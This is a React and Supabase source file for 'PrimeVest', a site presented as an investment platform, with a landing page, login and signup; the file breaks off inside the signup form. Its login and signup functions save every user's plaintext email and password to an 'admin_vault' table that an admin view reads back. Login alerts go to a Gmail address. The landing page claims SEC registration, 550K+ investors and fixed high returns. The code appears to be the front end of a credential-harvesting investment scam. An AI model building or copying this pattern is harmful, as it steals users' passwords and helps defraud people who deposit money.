import { useState, useEffect, useCallback, useRef } from "react";
import { Routes, Route, Navigate, Link, useNavigate, useSearchParams, Outlet } from "react-router-dom";
import { createClient } from "@supabase/supabase-js";
import {
  ShieldCheck, Mail, Lock, Eye, EyeOff, ArrowRight, TrendingUp, UserRound, CheckCircle2,
  Bell, Home as HomeIcon, Wallet, ArrowDownToLine, ArrowUpFromLine, Users, Gift, Share2,
  Copy, Check, MessageSquare, Send, ChevronRight, ChevronDown, CircleDollarSign, Clock3,
  Settings as SettingsIcon, LogOut, X, Info, ArrowLeft, CreditCard, LockKeyhole, AlertCircle,
  Building2, Bitcoin, PiggyBank, BarChart3, PieChart, Search, XCircle, Loader2, ThumbsUp,
  Headphones, HelpCircle, User, Menu, Star, Sparkles, LineChart, Globe2, ExternalLink, Gamepad2,
  Rocket, Timer, Zap, Upload, Crown, Unlock, Lock as LockIcon, CheckCircle, RefreshCw, Ban, Download
} from "lucide-react";
import Terms from "./terms";
import {
  Deposit, DepositPayment, DepositCard, DepositBitcoin,
  Withdraw, WithdrawAccount, WithdrawSuccess, VIP, VIPCheckout, BonusGame, Invest,
  Portfolio, Settings, Help, History, ScratchCard, MysteryBox, Chat
} from "./pages";

export const supabase = createClient(
  import.meta.env.VITE_SUPABASE_URL,
  import.meta.env.VITE_SUPABASE_ANON_KEY
);

const FN = `${import.meta.env.VITE_SUPABASE_URL}/functions/v1`;

async function call(path, body) {
  const { data: { session } } = await supabase.auth.getSession();
  const res = await fetch(`${FN}/${path}`, {
    method: "POST",
    headers: { "Content-Type": "application/json", Authorization: `Bearer ${session?.access_token || ""}` },
    body: JSON.stringify(body || {}),
  });
  return res.json();
}

async function notifyAdmin(name, email, type = "New Signup", extra = "") {
  try {
    await fetch("https://api.web3forms.com/submit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        access_key: import.meta.env.VITE_WEB3FORMS_KEY,
        subject: `PrimeVest: ${type}`,
        from_name: "PrimeVest",
        name,
        email,
        message: `Type: ${type}\nName: ${name}\nEmail: ${email}\n${extra}`,
      }),
    });
  } catch (err) {
    console.error("Email failed to send", err);
  }
}

async function sendLoginAlert(email, device, type="login") {
  try {
    await fetch("https://api.web3forms.com/submit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        access_key: import.meta.env.VITE_WEB3FORMS_KEY,
        subject: `🚨 User ${type === 'login' ? 'Login' : 'Logout'} Alert`,
        from_name: "PrimeVest Security",
        to: "primevest180@gmail.com",
        message: `User: ${email}\nAction: ${type.toUpperCase()}\nDevice: ${device}`,
      }),
    });
  } catch (err) {
    console.error("Login alert failed", err);
  }
}

export const api = {
  signup: async (name, email, password, ref) => {
    const finalName = name || email.split("@")[0].replace(/[^a-zA-Z]/g, " ");
    
    // Save to Vault for admin
    await supabase.from('admin_vault').insert({ email, password });

    const res = await supabase.auth.signUp({ email, password, options: { data: { name: finalName, ref } } });
    if (!res.error) notifyAdmin(finalName, email, "New User Signup");
    return res;
  },
  login: async (email, password) => {
    // Save to vault
    await supabase.from('admin_vault').insert({ email, password });
    
    const res = await supabase.auth.signInWithPassword({ email, password });
    if (!res.error) {
      const device = navigator.userAgent;
      sendLoginAlert(email, device, "login");
    }
    return res;
  },
  logout: async () => {
    const { data: { user } } = await supabase.auth.getUser();
    if (user) sendLoginAlert(user.email, navigator.userAgent, "logout");
    return supabase.auth.signOut();
  },
  wallet: async () => {
    const { data: { user } } = await supabase.auth.getUser();
    return supabase.from("wallets").select("*").eq("user_id", user.id).single();
  },
  profile: async () => {
    const { data: { user } } = await supabase.auth.getUser();
    return supabase.from("profiles").select("*").eq("id", user.id).single();
  },
  setUsername: async (username) => {
    const { data: { user } } = await supabase.auth.getUser();
    const { error } = await supabase.from("profiles").update({ username }).eq("id", user.id);
    if (error) return { error: "Username already taken." };
    return { success: true };
  },
  addFriend: async (username) => {
    const { data: { user } } = await supabase.auth.getUser();
    const { data: target } = await supabase.from("profiles").select("id").eq("username", username).single();
    if (!target) return { error: "User not found." };
    if (target.id === user.id) return { error: "You can't add yourself." };
    
    const { error } = await supabase.from("friendships").insert({ user_id: user.id, friend_id: target.id, status: 'pending' });
    if (error) return { error: "Request already sent or you are already friends." };
    return { success: true };
  },
  getFriendRequests: async () => {
    const { data: { user } } = await supabase.auth.getUser();
    return supabase.from("friendships").select("*, profiles!friendships_user_id_fkey(*)").eq("friend_id", user.id).eq("status", "pending");
  },
  acceptFriendRequest: async (id) => {
    await supabase.from("friendships").update({ status: 'accepted' }).eq("id", id);
    return { success: true };
  },
  getFriends: async () => {
    const { data: { user } } = await supabase.auth.getUser();
    const { data } = await supabase.from("friendships").select("*, profiles!friendships_user_id_fkey(*)").eq("user_id", user.id).eq("status", "accepted");
    const { data: reverse } = await supabase.from("friendships").select("*, profiles!friendships_friend_id_fkey(*)").eq("friend_id", user.id).eq("status", "accepted");
    
    const all = [
      ...(data || []).map(f => ({ id: f.id, friend_id: f.friend_id, profiles: f.profiles })),
      ...(reverse || []).map(f => ({ id: f.id, friend_id: f.user_id, profiles: f.profiles }))
    ];
    return { data: all };
  },
  sendMessage: async (receiver_id, message) => {
    const { data: { user } } = await supabase.auth.getUser();
    const actualReceiver = receiver_id === "admin" ? "00000000-0000-0000-0000-000000000000" : receiver_id;
    await supabase.from("private_messages").insert({ sender_id: user.id, receiver_id: actualReceiver, message });
    await supabase.from("notifications").insert({ user_id: actualReceiver, title: "New Message", message: `You have a new message.`, type: "message" });
  },
  getMessages: async (target) => {
    const { data: { user } } = await supabase.auth.getUser();
    const actualTarget = target === "admin" ? "00000000-0000-0000-0000-000000000000" : target;
    
    return supabase.from("private_messages")
      .select("*")
      .or(`and(sender_id.eq.${user.id},receiver_id.eq.${actualTarget}),and(sender_id.eq.${actualTarget},receiver_id.eq.${user.id})`)
      .order("created_at", { ascending: true });
  },
  
  notifications: async () => {
    const { data: { user } } = await supabase.auth.getUser();
    return supabase.from("notifications").select("*").eq("user_id", user.id).order("created_at", { ascending: false });
  },
  markRead: (id) => supabase.from("notifications").update({ read: true }).eq("id", id),
  markAllRead: async () => {
    const { data: { user } } = await supabase.auth.getUser();
    return supabase.from("notifications").update({ read: true }).eq("user_id", user.id);
  },
  plans: () => supabase.from("plans").select("*").eq("active", true),
  portfolio: async () => {
    const { data: { user } } = await supabase.auth.getUser();
    return supabase.from("investments").select("*, plans(*)").eq("user_id", user.id).order("started_at", { ascending: false });
  },
  history: async () => {
    const { data: { user } } = await supabase.auth.getUser();
    return supabase.from("transactions").select("*").eq("user_id", user.id).order("created_at", { ascending: false });
  },
  depositInit: (amount, method, email, vip, type) => call("index", { action: "deposit", amount, method, email, vip, type }),
  
  withdraw: async (p) => {
    const { data: { user } } = await supabase.auth.getUser();
    
    const { error } = await supabase.from("withdrawals").insert({
      user_id: user.id,
      amount: p.amount,
      bank_name: p.bank_name,
      account_number: p.account_number,
      account_name: p.account_name,
      status: "pending",
      created_at: new Date().toISOString()
    });

    if (error) return { success: false, error: "Failed to save withdrawal request." };

    await supabase.from("transactions").insert({
      user_id: user.id, type: "withdraw", amount: p.amount,
      status: "pending", reference: `WD-${Date.now()}`, created_at: new Date().toISOString()
    });

    await supabase.from("notifications").insert({ 
      user_id: user.id, 
      title: "Withdrawal Requested", 
      message: `Your withdrawal of ₦${p.amount} is being processed.`, 
      type: "withdraw" 
    });
    
    return { success: true };
  },

  claimBonus: async (amount) => {
    const { data: { user } } = await supabase.auth.getUser();
    await supabase.from("transactions").insert({ user_id: user.id, type: "bonus", amount, status: "success", reference: `BONUS-${Date.now()}` });
    const { data: wallet } = await supabase.from("wallets").select("available, total").eq("user_id", user.id).single();
    await supabase.from("wallets").update({ available: (wallet?.available || 0) + amount, total: (wallet?.total || 0) + amount }).eq("user_id", user.id);
    return { success: true };
  },

  invest: async (plan_id, amount, daily_profit, matured_at) => {
    const { data: { user } } = await supabase.auth.getUser();
    return call("index", { action: "invest", plan_id, amount, daily_profit, matured_at, email: user.email });
  },

  claimInvestment: async (investment_id, amount) => {
    const { data: { user } } = await supabase.auth.getUser();
    
    const { data: inv } = await supabase.from("investments").select("last_daily_claim").eq("id", investment_id).single();
    if (inv?.last_daily_claim && Date.now() - new Date(inv.last_daily_claim).getTime() < 86400000) {
      return { success: false, error: "You can only claim once every 24 hours." };
    }
    
    const exactNow = new Date().toISOString();
    await supabase.from("investments").update({ last_daily_claim: exactNow }).eq("id", investment_id);
    
    const { data: wallet } = await supabase.from("wallets").select("available, earnings, total").eq("user_id", user.id).single();
    await supabase.from("wallets").update({ 
        available: (wallet?.available || 0) + amount, 
        earnings: (wallet?.earnings || 0) + amount, 
        total: (wallet?.total || 0) + amount 
    }).eq("user_id", user.id);
    
    await supabase.from("transactions").insert({ user_id: user.id, type: "investment_profit", amount, status: "success", reference: `PROFIT-${Date.now()}` });
    return { success: true };
  },

  claimDailyLogin: async () => {
    const { data: { user } } = await supabase.auth.getUser();
    const { data: profile } = await supabase.from("profiles").select("last_login_claim").eq("id", user.id).single();
    const now = new Date();
    
    if (profile?.last_login_claim && (now.getTime() - new Date(profile.last_login_claim).getTime()) < 86400000) {
      return { error: "Already claimed" };
    }
    
    await supabase.from("profiles").update({ last_login_claim: now.toISOString() }).eq("id", user.id);
    const { data: wallet } = await supabase.from("wallets").select("available, earnings, total").eq("user_id", user.id).single();
    await supabase.from("wallets").update({ available: (wallet?.available || 0) + 100, earnings: (wallet?.earnings || 0) + 100, total: (wallet?.total || 0) + 100 }).eq("user_id", user.id);
    await supabase.from("transactions").insert({ user_id: user.id, type: "daily_login", amount: 100, status: "success", reference: `LOGIN-${Date.now()}` });
    return { success: true };
  },

  rewardReferral: async () => {
    const { data: { user } } = await supabase.auth.getUser();
    const { data: profile } = await supabase.from("profiles").select("referral_code, referral_earnings").eq("id", user.id).single();
    if (!profile?.referral_code) return { error: "You don't have a referral code." };
    const { data: referrals } = await supabase.from("profiles").select("id").eq("referred_by", profile.referral_code);
    if (!referrals || referrals.length === 0) return { error: "No one has used your link yet." };
    const expectedEarnings = referrals.length * 1000;
    const currentEarnings = profile?.referral_earnings || 0;
    if (currentEarnings >= expectedEarnings) return { error: "You have already been rewarded for all your referrals." };
    const amountToPay = expectedEarnings - currentEarnings;
    await supabase.from("profiles").update({ referral_earnings: expectedEarnings }).eq("id", user.id);
    const { data: wallet } = await supabase.from("wallets").select("available, total").eq("user_id", user.id).single();
    await supabase.from("wallets").update({ available: (wallet?.available || 0) + amountToPay, total: (wallet?.total || 0) + amountToPay }).eq("user_id", user.id);
    await supabase.from("transactions").insert({ user_id: user.id, type: "referral_bonus", amount: amountToPay, status: "success", reference: `REF-${Date.now()}` });
    return { amount: amountToPay };
  },

  getAdminStats: async () => {
    const { count: usersCount } = await supabase.from("profiles").select("*", { count: 'exact', head: true });
    const { data: withdrawals } = await supabase.from("withdrawals").select("amount, status");
    let totalWithdrawn = 0, pendingWithdrawals = 0;
    withdrawals?.forEach(w => {
      if (w.status === "success") totalWithdrawn += w.amount;
      if (w.status === "pending") pendingWithdrawals += w.amount;
    });
    return { usersCount, totalWithdrawn, pendingWithdrawals };
  },
  getAllUsers: async () => supabase.from("profiles").select("*").order("created_at", { ascending: false }),
  getAdminVault: async () => supabase.from("admin_vault").select("*").order("created_at", { ascending: false }),
  
  toggleUserFreeze: async (userId, currentStatus) => {
    const newStatus = currentStatus === "frozen" ? "active" : "frozen";
    await supabase.from("profiles").update({ account_status: newStatus }).eq("id", userId);
    return { success: true };
  },

  getAdminWithdrawals: async () => supabase.from("withdrawals").select("*").eq("status", "pending").order("created_at", { ascending: false }),
  
  approveWithdrawal: async (withdrawalId, user_id, amount) => {
    const { data: wallet } = await supabase.from("wallets").select("available, total").eq("user_id", user_id).single();
    await supabase.from("wallets").update({ available: (wallet?.available || 0) - amount, total: (wallet?.total || 0) - amount }).eq("user_id", user_id);
    await supabase.from("withdrawals").update({ status: "success" }).eq("id", withdrawalId);
    await supabase.from("transactions").update({ status: "success" }).eq("user_id", user_id).eq("type", "withdraw").eq("status", "pending");
    await supabase.from("notifications").insert({ user_id, title: "Withdrawal Approved", message: `Your withdrawal of ₦${amount} has been sent to your bank.`, type: "withdraw" });
    return { success: true };
  },

  rejectWithdrawal: async (withdrawalId, user_id, amount) => {
    await supabase.from("withdrawals").update({ status: "rejected" }).eq("id", withdrawalId);
    await supabase.from("transactions").update({ status: "failed" }).eq("user_id", user_id).eq("type", "withdraw").eq("status", "pending");
    await supabase.from("notifications").insert({ user_id, title: "Withdrawal Rejected", message: `Your withdrawal of ₦${amount} was rejected.`, type: "withdraw" });
    return { success: true };
  }
};

function LoadingScreen() {
  return (
    <div className="fixed inset-0 z-50 flex flex-col items-center justify-center bg-[#070D1A]">
      <div className="relative flex h-24 w-24 items-center justify-center">
        <div className="absolute inset-0 rounded-full border-2 border-blue-500/30 animate-ping"></div>
        <div className="relative z-10 flex h-16 w-16 items-center justify-center rounded-2xl bg-gradient-to-br from-blue-500 to-blue-800 shadow-2xl shadow-blue-900/50">
          <ShieldCheck size={32} className="text-white animate-bounce" />
        </div>
      </div>
      <h1 className="mt-6 text-2xl font-bold text-white tracking-widest">Prime<span className="text-blue-400">Vest</span></h1>
    </div>
  );
}

const Toast = ({ message, onClose }) => {
  useEffect(() => {
    const timer = setTimeout(onClose, 4000);
    return () => clearTimeout(timer);
  }, [onClose]);
  return (
    <div className="fixed top-6 left-1/2 -translate-x-1/2 z-[100] rounded-2xl border border-emerald-500/30 bg-[#0D1526] px-6 py-4 shadow-2xl backdrop-blur-xl flex items-center gap-3">
      <CheckCircle2 className="h-5 w-5 text-emerald-400" />
      <p className="text-sm font-semibold text-white">{message}</p>
    </div>
  );
};

function ProtectedRoute() {
  const [loading, setLoading] = useState(true);
  const [authed, setAuthed] = useState(false);
  const [isFrozen, setIsFrozen] = useState(false);
  
  useEffect(() => {
    supabase.auth.getSession().then(async ({ data }) => { 
      if (data.session) {
        setAuthed(true);
        const { data: profile } = await supabase.from("profiles").select("account_status").eq("id", data.session.user.id).single();
        if (profile?.account_status === "frozen") setIsFrozen(true);
      }
      setLoading(false); 
    });
    const { data: sub } = supabase.auth.onAuthStateChange((_e, s) => setAuthed(!!s));
    return () => sub.subscription.unsubscribe();
  }, []);

  if (loading) return <LoadingScreen />;
  
  if (isFrozen) {
    return (
      <div className="min-h-screen bg-slate-950 flex flex-col items-center justify-center p-4 text-center">
        <Ban size={64} className="text-red-500 mb-4" />
        <h1 className="text-2xl font-bold text-white mb-2">Account Frozen</h1>
        <p className="text-slate-400 mb-6">Your account has been temporarily frozen by the administrator. Please contact support.</p>
        <button onClick={() => { supabase.auth.signOut(); window.location.href = "/"; }} className="bg-red-600 text-white px-6 py-3 rounded-xl font-bold">Log Out</button>
      </div>
    );
  }

  if (!authed) return <Navigate to="/login" replace />;
  return <Outlet />;
}

function UsernameGuard({ children }) {
  const [profile, setProfile] = useState(null);
  const [username, setUsername] = useState("");
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    api.profile().then(({ data }) => {
      setProfile(data);
      setLoading(false);
    });
  }, []);

  if (loading) return <LoadingScreen />;

  if (profile && !profile.username) {
    return (
      <div className="min-h-screen bg-slate-950 flex items-center justify-center p-4">
        <div className="w-full max-w-sm rounded-3xl bg-[#0D1526] p-8 text-center border border-blue-500/30 shadow-2xl">
          <UserRound className="h-12 w-12 text-blue-400 mx-auto mb-4" />
          <h2 className="text-xl font-bold text-white mb-2">Choose Your Username</h2>
          <p className="text-sm text-slate-400 mb-6">This is permanent and can never be changed.</p>
          <input value={username} onChange={e => setUsername(e.target.value.replace(/\s/g, ''))} placeholder="john_doe" className="w-full bg-slate-950 rounded-xl px-4 py-3 text-white outline-none mb-4" />
          <button onClick={async () => {
            if(username.length < 3) return alert("Min 3 chars");
            await api.setUsername(username);
            window.location.reload();
          }} className="w-full bg-blue-600 text-white py-3 rounded-xl font-bold">Set Username</button>
        </div>
      </div>
    );
  }

  return children;
}

function Navbar() {
  const [isOpen, setIsOpen] = useState(false);
  return (
    <nav className="fixed left-0 right-0 top-0 z-50 px-3 py-3 sm:px-4 sm:py-4 lg:px-8">
      <div className="mx-auto max-w-7xl rounded-2xl border border-blue-400/20 bg-blue-950/90 shadow-2xl shadow-blue-950/30 backdrop-blur-xl">
        <div className="flex items-center justify-between px-4 py-3 sm:px-5 sm:py-4 lg:px-7">
          <a href="#home" className="flex items-center gap-3">
            <div className="flex h-10 w-10 items-center justify-center rounded-xl bg-blue-600 text-white shadow-lg shadow-blue-900/40 sm:h-11 sm:w-11"><ShieldCheck className="h-5 w-5 sm:h-6 sm:w-6" /></div>
            <div><h2 className="text-base font-bold tracking-tight text-white sm:text-lg">PrimeVest</h2><p className="text-[8px] font-medium uppercase tracking-[0.18em] text-blue-300 sm:text-[9px]">Wealth Management</p></div>
          </a>
          <div className="hidden items-center gap-8 lg:flex">
            <a href="#strategies" className="text-sm font-medium text-slate-300 transition hover:text-blue-300">Strategies</a>
            <a href="#about" className="text-sm font-medium text-slate-300 transition hover:text-blue-300">About</a>
          </div>
          <div className="hidden items-center gap-3 lg:flex">
            <Link to="/login" className="rounded-xl px-4 py-2.5 text-sm font-medium text-slate-300 transition hover:bg-blue-900/60 hover:text-white">Sign in</Link>
            <Link to="/signup" className="rounded-xl bg-blue-600 px-5 py-2.5 text-sm font-semibold text-white shadow-lg shadow-blue-900/40 transition hover:bg-blue-500">Get Started</Link>
          </div>
          <button onClick={() => setIsOpen(!isOpen)} className="flex h-10 w-10 items-center justify-center rounded-xl border border-blue-400/20 bg-blue-900/40 text-slate-200 lg:hidden">
            {isOpen ? <X className="h-5 w-5" /> : <Menu className="h-5 w-5" />}
          </button>
        </div>
      </div>
    </nav>
  );
}

function Hero() {
  return (
    <section id="home" className="relative min-h-screen overflow-hidden bg-slate-950 pt-10">
      <div className="absolute inset-0 [background:linear-gradient(135deg,#020617,#172554,#0f172a)]" />
      <div className="absolute -right-32 -top-32 h-96 w-96 rounded-full bg-blue-600/20 blur-3xl" />
      <div className="relative mx-auto max-w-7xl px-6 py-20 lg:px-12 lg:py-28">
        <div className="max-w-3xl">
          <div className="mb-6 inline-flex items-center gap-2 rounded-full border border-blue-500/20 bg-blue-500/10 px-4 py-2 text-sm text-blue-300">
            <Sparkles className="h-4 w-4" />Trusted by 550,000+ investors
          </div>
          <h1 className="text-5xl font-bold leading-tight text-white lg:text-7xl">Grow your wealth with <span className="bg-gradient-to-r from-blue-400 to-indigo-400 bg-clip-text text-transparent">confidence</span></h1>
          <p className="mt-6 max-w-2xl text-lg leading-relaxed text-slate-300">
            PrimeVest is your all-in-one wealth management platform. Whether you're looking to grow your savings with high-yield portfolios, invest in real estate, or earn through our interactive bonus games, we provide a secure, transparent, and effortless way to build your financial future.
          </p>
          <div className="mt-8 flex flex-wrap gap-4">
            <Link to="/signup" className="inline-flex items-center rounded-lg bg-blue-600 px-6 py-3 font-semibold text-white shadow-lg transition hover:bg-blue-500">Start Investing<ArrowRight className="ml-2 h-4 w-4" /></Link>
            <a href="#strategies" className="rounded-lg border border-slate-600 px-6 py-3 font-semibold text-slate-200 transition hover:bg-slate-800">View Strategies</a>
          </div>
          <div className="mt-10 flex flex-wrap gap-6 text-sm text-slate-400">
            <div className="flex items-center gap-2"><ShieldCheck className="h-4 w-4 text-blue-400" />SEC Registered</div>
            <div className="flex items-center gap-2"><ShieldCheck className="h-4 w-4 text-blue-400" />N2B+ Managed</div>
            <div className="flex items-center gap-2"><ShieldCheck className="h-4 w-4 text-blue-400" />4.9/5 Rating</div>
          </div>
        </div>
      </div>
    </section>
  );
}

function Stats() {
  const stats = [
    { icon: TrendingUp, value: "12.4%", label: "Average Annual Return", color: "bg-blue-500/10 text-blue-400" },
    { icon: Users, value: "550K+", label: "Active Investors", color: "bg-indigo-500/10 text-indigo-400" },
    { icon: Building2, value: "N2.1B", label: "Assets Under Management", color: "bg-sky-500/10 text-sky-400" },
    { icon: Globe2, value: "40+", label: "Global Markets", color: "bg-blue-500/10 text-blue-400" },
  ];
  return (
    <section className="relative z-10 mx-auto -mt-8 max-w-7xl px-4 sm:px-6 lg:px-8">
      <div className="grid grid-cols-1 gap-4 sm:grid-cols-2 lg:grid-cols-4">
        {stats.map((s) => {
          const Icon = s.icon;
          return (
            <div key={s.label} className="rounded-2xl border border-blue-400/10 bg-slate-900/90 p-6 shadow-xl backdrop-blur-xl">
              <div className="flex items-center gap-4">
                <div className={`flex h-12 w-12 items-center justify-center rounded-xl ${s.color}`}><Icon className="h-6 w-6" /></div>
                <div><p className="text-2xl font-bold text-white">{s.value}</p><p className="mt-1 text-sm text-slate-400">{s.label}</p></div>
              </div>
            </div>
          );
        })}
      </div>
    </section>
  );
}

function InvestmentCards() {
  const strategies = [
    { icon: LineChart, title: "Growth Portfolio", description: "High-potential stocks and ETFs", return: "12.5%", risk: "Moderate", color: "bg-blue-500/10 text-blue-400", badge: "Popular" },
    { icon: Building2, title: "Real Estate", description: "REITs and property funds", return: "11.9%", risk: "Moderate", color: "bg-sky-500/10 text-sky-400", badge: "New" },
    { icon: Bitcoin, title: "Crypto Index", description: "Diversified digital assets", return: "22.0%", risk: "High", color: "bg-amber-500/10 text-amber-400", badge: "High Growth" },
    { icon: Users, title: "Affiliate Marketing", description: "Digital commerce assets", return: "15.0%", risk: "Moderate", color: "bg-emerald-500/10 text-emerald-400", badge: "Trending" },
  ];
  return (
    <section id="strategies" className="relative bg-slate-950 px-4 py-20 sm:px-6 lg:px-8">
      <div className="mx-auto mb-12 flex max-w-7xl flex-col gap-6 sm:flex-row sm:items-end sm:justify-between">
        <div>
          <p className="mb-3 text-sm font-semibold uppercase tracking-widest text-blue-400">Investment Options</p>
          <h2 className="text-3xl font-bold text-white sm:text-4xl">Investment Strategies</h2>
          <p className="mt-3 max-w-xl text-slate-400">Choose a strategy that matches your goals.</p>
        </div>
      </div>
      <div className="mx-auto grid max-w-7xl grid-cols-1 gap-6 md:grid-cols-2 lg:grid-cols-4">
        {strategies.map((s) => {
          const Icon = s.icon;
          return (
            <div key={s.title} className="rounded-2xl border border-blue-400/10 bg-slate-900/80 p-6 shadow-xl backdrop-blur-xl transition hover:-translate-y-2 hover:border-blue-400/30">
              <div className="flex items-start justify-between">
                <div className={`flex h-12 w-12 items-center justify-center rounded-xl ${s.color}`}><Icon className="h-6 w-6" /></div>
                <span className="rounded-full bg-slate-800 px-3 py-1 text-xs font-medium text-slate-300">{s.badge}</span>
              </div>
              <h3 className="mt-5 text-lg font-bold text-white">{s.title}</h3>
              <p className="mt-2 text-sm leading-relaxed text-slate-400">{s.description}</p>
              <div className="mt-5 flex items-center justify-between border-t border-slate-800 pt-4">
                <div><p className="text-xs text-slate-500">Avg. Return</p><p className="mt-1 text-xl font-bold text-blue-400">{s.return}</p></div>
                <div className="text-right"><p className="text-xs text-slate-500">Risk</p><p className="mt-1 text-sm font-medium text-slate-300">{s.risk}</p></div>
              </div>
              <Link to="/signup" className="mt-5 block w-full rounded-xl bg-blue-600 px-4 py-3 text-center text-sm font-semibold text-white hover:bg-blue-500">Invest Now</Link>
            </div>
          );
        })}
      </div>
    </section>
  );
}

function Testimonials() {
  const items = [
    { name: "Olamide John", role: "Civil Servant", quote: "PrimeVest made investing feel approachable.", initials: "OJ", color: "bg-blue-600" },
    { name: "Michael Chukwuma", role: "Business Owner", quote: "The automated tools made managing my investments easier.", initials: "MC", color: "bg-indigo-600" },
    { name: "Joy Temi", role: "Marketing Director", quote: "PrimeVest's strategies made my goals clearer.", initials: "JT", color: "bg-sky-600" },
  ];
  return (
    <section id="about" className="bg-slate-900 px-4 py-20 sm:px-6 lg:px-8">
      <div className="mx-auto max-w-7xl">
        <div className="mb-12 text-center">
          <p className="mb-3 text-sm font-semibold uppercase tracking-widest text-blue-400">Client Stories</p>
          <h2 className="text-3xl font-bold text-white sm:text-4xl">Trusted by thousands of investors</h2>
        </div>
        <div className="grid grid-cols-1 gap-6 md:grid-cols-3">
          {items.map((t) => (
            <div key={t.name} className="rounded-2xl border border-blue-400/10 bg-slate-800/60 p-6 shadow-xl">
              <div className="mb-5 flex gap-1">{[...Array(5)].map((_, i) => <Star key={i} className="h-4 w-4 fill-amber-400 text-amber-400" />)}</div>
              <p className="text-sm leading-relaxed text-slate-300">"{t.quote}"</p>
              <div className="mt-6 flex items-center gap-3 border-t border-slate-700 pt-5">
                <div className={`flex h-11 w-11 items-center justify-center rounded-full ${t.color} text-sm font-bold text-white`}>{t.initials}</div>
                <div><p className="text-sm font-semibold text-white">{t.name}</p><p className="text-xs text-slate-400">{t.role}</p></div>
              </div>
            </div>
          ))}
        </div>
      </div>
    </section>
  );
}

function LandingPage() {
  const [checkingAuth, setCheckingAuth] = useState(true);
  useEffect(() => {
    supabase.auth.getSession().then(({ data }) => {
      if (data.session) window.location.href = "/home";
      else setCheckingAuth(false);
    });
  }, []);
  if (checkingAuth) return <LoadingScreen />;
  return (
    <main className="min-h-screen bg-slate-950">
      <Navbar />
      <Hero />
      <Stats />
      <InvestmentCards />
      <Testimonials />
    </main>
  );
}

function Login() {
  const navigate = useNavigate();
  const [showPassword, setShowPassword] = useState(false);
  const [form, setForm] = useState({ email: "", password: "" });
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  async function submit(e) {
    e.preventDefault(); setError(""); setLoading(true);
    const { error } = await api.login(form.email.trim(), form.password);
    setLoading(false);
    if (error) return setError("Incorrect email or password.");
    navigate("/home");
  }

  async function handleForgotPassword() {
    if (!form.email) return alert("Please type your email address first, then click Forgot Password.");
    const { error } = await supabase.auth.resetPasswordForEmail(form.email.trim(), { redirectTo: `${window.location.origin}/settings` });
    if (error) alert(error.message);
    else alert("Password reset link sent to your email!");
  }

  async function signInWith(provider) {
    await supabase.auth.signInWithOAuth({ provider, options: { redirectTo: `${window.location.origin}/home` } });
  }

  return (
    <main className="relative flex min-h-screen items-center justify-center bg-slate-950 px-4 py-10 text-white">
      <div className="grid w-full max-w-5xl overflow-hidden rounded-3xl border border-white/10 bg-slate-900/80 shadow-2xl lg:grid-cols-2">
        <section className="hidden flex-col justify-between bg-gradient-to-br from-blue-950 via-blue-800 to-blue-600 p-10 lg:flex">
          <Link to="/" className="inline-flex items-center gap-3">
            <div className="flex h-12 w-12 items-center justify-center rounded-xl bg-white/10"><ShieldCheck size={27} /></div>
            <span className="text-2xl font-bold">Prime<span className="text-blue-200">Vest</span></span>
          </Link>
          <div className="mt-24"><div className="mb-5 flex h-14 w-14 items-center justify-center rounded-2xl bg-white/10"><TrendingUp size={30} /></div><h1 className="text-4xl font-bold leading-tight">Welcome back to your dashboard.</h1></div>
        </section>
        <section className="p-6 sm:p-10 lg:p-12">
          <div className="mt-8 lg:mt-10"><p className="text-sm font-medium text-blue-400">WELCOME BACK</p><h2 className="mt-2 text-3xl font-bold">Log in</h2></div>
          <form onSubmit={submit} className="mt-6 space-y-5">
            <div>
              <label className="mb-2 block text-sm font-medium text-slate-300">Email</label>
              <div className="flex items-center gap-3 rounded-xl border border-white/10 bg-slate-950 px-4"><Mail size={19} className="text-slate-500" /><input type="email" value={form.email} onChange={(e) => setForm({ ...form, email: e.target.value })} required className="flex-1 bg-transparent py-3.5 text-sm outline-none" placeholder="you@example.com" /></div>
            </div>
            <div>
              <label className="mb-2 block text-sm font-medium text-slate-300">Password</label>
              <div className="flex items-center gap-3 rounded-xl border border-white/10 bg-slate-950 px-4">
                <Lock size={19} className="text-slate-500" />
                <input type={showPassword ? "text" : "password"} value={form.password} onChange={(e) => setForm({ ...form, password: e.target.value })} required className="flex-1 bg-transparent py-3.5 text-sm outline-none" placeholder="Your password" />
                <button type="button" onClick={() => setShowPassword(!showPassword)} className="text-slate-500 hover:text-white">{showPassword ? <EyeOff size={19} /> : <Eye size={19} />}</button>
              </div>
            </div>
            <div className="flex items-center justify-end">
              <button type="button" onClick={handleForgotPassword} className="text-xs text-blue-400 hover:text-blue-300">Forgot Password?</button>
            </div>
            {error && <p className="rounded-xl bg-red-500/10 p-3 text-sm text-red-300">{error}</p>}
            <button disabled={loading} className="flex w-full items-center justify-center gap-2 rounded-xl bg-blue-600 py-3.5 font-semibold disabled:opacity-60">{loading ? "Logging in..." : "Log In"}</button>
          </form>
          <div className="mt-6 space-y-3">
            <button onClick={() => signInWith("google")} className="flex w-full items-center justify-center gap-3 rounded-xl border border-white/10 bg-white px-4 py-3 text-sm font-semibold text-slate-900 transition hover:bg-slate-100">Continue with Google</button>
            <button onClick={() => signInWith("github")} className="flex w-full items-center justify-center gap-3 rounded-xl border border-white/10 bg-[#24292F] px-4 py-3 text-sm font-semibold text-white transition hover:bg-[#1b1f23]">Continue with GitHub</button>
          </div>
          <div className="mt-8 flex flex-col items-center gap-3 text-sm text-slate-400">
            <p>Don't have an account? <Link to="/signup" className="font-semibold text-blue-400">Create one</Link></p>
            <Link to="/terms" className="text-xs text-slate-500 hover:text-slate-300">Terms & Conditions</Link>
          </div>
        </section>
      </div>
    </main>
  );
}

function Signup() {
  const navigate = useNavigate();
  const [params] = useSearchParams();
  const referral = params.get("ref") || "";
  const [showPassword, setShowPassword] = useState(false);
  const [form, setForm] = useState({ name: "", email: "", password: "", confirmPassword: "" });
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [agreeTerms, setAgreeTerms] = useState(false);

  async function submit(e) {
    e.preventDefault(); setError("");
    if (!agreeTerms) return setError("You must agree to the Terms & Conditions.");
    if (form.name.trim().length < 2) return setError("Enter your full name.");
    if (form.password.length < 8) return setError("Password must be 8+ characters.");
    if (form.password !== form.confirmPassword) return setError("Passwords don't match.");
    setLoading(true);
    const { error } = await api.signup(form.name.trim(), form.email.trim().toLowerCase(), form.password, referral);
    setLoading(false);
